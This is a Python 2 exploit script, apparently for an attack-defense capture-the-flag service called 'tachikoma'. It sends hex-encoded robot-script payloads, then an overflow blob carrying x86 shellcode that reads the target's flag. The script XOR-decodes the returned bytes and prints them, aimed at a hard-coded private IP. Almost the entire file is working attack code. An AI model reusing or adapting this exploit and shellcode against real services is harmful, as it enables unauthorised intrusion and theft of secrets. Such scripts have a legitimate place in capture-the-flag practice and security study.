import socket
import struct
import time
import telnetlib
import os
import sys

service = 'tachikoma'         # target service (required)
timeout = 3                 # define timeout here
author = 'm3m3d4'          # author

host = 'localhost'
port = 9999

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def exploit(host):
    port = 9

    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.connect((host, port))
    f = ss.makefile('rw', bufsize=0)

    s = '340a'.decode('hex')
    f.write(s)

    s = '3437310a'.decode('hex')
    f.write(s)

    s = '4d697373696c654869740a202020207b0a20202020202020207072696e74282022486974206279206d6973736c652220290a202020207d0a436f72650a202020207b0a202020207d0a466f756e64526f626f740a202020207b0a202020207d0a496e69740a202020207b0a20202020202020206e616d652820226675636b726f626f742220290a2020202020202020726567636f7265282022436f72652220290a2020202020202020726567636c646d697373696c652820228c5558bfe705c426222c203431353634363939333120290a2020202020202020726567647463726f626f74282022924a18aa5c0c4025222c203431353734333837303620290a2020202020202020726567617363616e282022245f10dd71da86bc222c203431353639323432363720290a202020202020202072656770696e672820223a88deeeb8b49502222c203431363534353837353820290a0a202020207d0a50696e6765640a202020207b0a20202020202020207072696e7428202250696e6765642066726f6d22205f636c6462656172696e67202268656164696e6722205f636c6468656164696e6720290a202020207d0a4175746f5363616e0a202020207b0a202020207d0a446561640a202020207b0a202020207d0a0a0a'
    s = s.decode('hex')
    f.write(s)

    s = '3437310a'.decode('hex')
    f.write(s)

    s = '436f72650a202020207b0a202020207d0a446561640a202020207b0a202020207d0a50696e6765640a202020207b0a20202020202020207072696e7428202250696e6765642066726f6d22205f636c6462656172696e67202268656164696e6722205f636c6468656164696e6720290a202020207d0a466f756e64526f626f740a202020207b0a202020207d0a4d697373696c654869740a202020207b0a20202020202020207072696e74282022486974206279206d6973736c652220290a202020207d0a4175746f5363616e0a202020207b0a202020207d0a496e69740a202020207b0a20202020202020206e616d652820226675636b726f626f742220290a2020202020202020726567636f7265282022436f72652220290a2020202020202020726567636c646d697373696c652820226f4bb6ac01c2df43222c203431353739393435383620290a2020202020202020726567647463726f626f7428202281b41efce83b6865222c203431353630303833313720290a2020202020202020726567617363616e282022082f1099e0784f30222c203431353431353234373720290a202020202020202072656770696e67282022fe2ac8a370b9926f222c203431353730363735343220290a0a202020207d0a0a0a'
    s = s.decode('hex')
    f.write(s)

    s = '3437310a'.decode('hex')
    f.write(s)

    s = '446561640a202020207b0a202020207d0a50696e6765640a202020207b0a20202020202020207072696e7428202250696e6765642066726f6d22205f636c6462656172696e67202268656164696e6722205f636c6468656164696e6720290a202020207d0a4175746f5363616e0a202020207b0a202020207d0a436f72650a202020207b0a202020207d0a4d697373696c654869740a202020207b0a20202020202020207072696e74282022486974206279206d6973736c652220290a202020207d0a496e69740a202020207b0a20202020202020206e616d652820226675636b726f626f742220290a2020202020202020726567636f7265282022436f72652220290a2020202020202020726567636c646d697373696c65282022e35235e5a16c3d71222c203431363139353839353720290a2020202020202020726567647463726f626f74282022a3e9500b831baef0222c203431363737383031353920290a2020202020202020726567617363616e282022ece9e8f64c3c1a5a222c203431353635313837383920290a202020202020202072656770696e67282022864c54aade5ba970222c203431353136383231333420290a0a202020207d0a466f756e64526f626f740a202020207b0a202020207d0a0a0a'
    s = s.decode('hex')
    f.write(s)

    s = '3436390a'.decode('hex')
    f.write(s)

    s = '2733204f2066204e2042206c207420512048204f20372072204e204820522061204420392037204e207020322073207320682038204b20302066204420372048203020472057206e206c204d206b2053203420712074206b204b2068205020352042207420652076204a2050203920342054206420772054203820592058206b20562068204c206d204e2057207020302035204f203920342043207a2053206b2046204120422067207a206f2064206a206120362061206f2053207020622072204a205020722074206d20772075204e2076204c2052203220582062204e2046204220552062203220502050207a2066207820532036205a204520592039204e206e203420712069206d206b2033203720332053205a203220612036205220592059204d2032206f2048206520302030204f204d207a20472062206d20382044206b207420702063206320382041207a20532036204c205120560000000000eb575b89da31c931c066b906008133dadaaadd4980c30439c175f289d331c0b005cd8083ec7089c331d2b27031c089e1b003cd809289d189e331c08033da494339c175f7b00431dbb30189e1cd8031c0b001cd80ffffffffffe8a4fffffff5b2c5b0bff5ccb1bbbdd9f2aebbc9b5b3b1c5b0bbda270a'
    s = s.decode('hex')
    f.write(s)

    ret = readuntil(f, '/end of function\n')
    flag = f.read(26)
    new_flag = ''
    #print flag.encode('hex')
    for i in xrange(len(flag)):
        new_flag += chr(ord(flag[i]) ^ 0xda)
    new_flag = new_flag.strip()
    print new_flag
    return new_flag
    #print flag.encode('hex')

    #print flag.encode('hex')

    #t = telnetlib.Telnet()
    #t.sock = ss
    #t.interact()

if __name__ == '__main__':
    exploit('192.168.165.135')
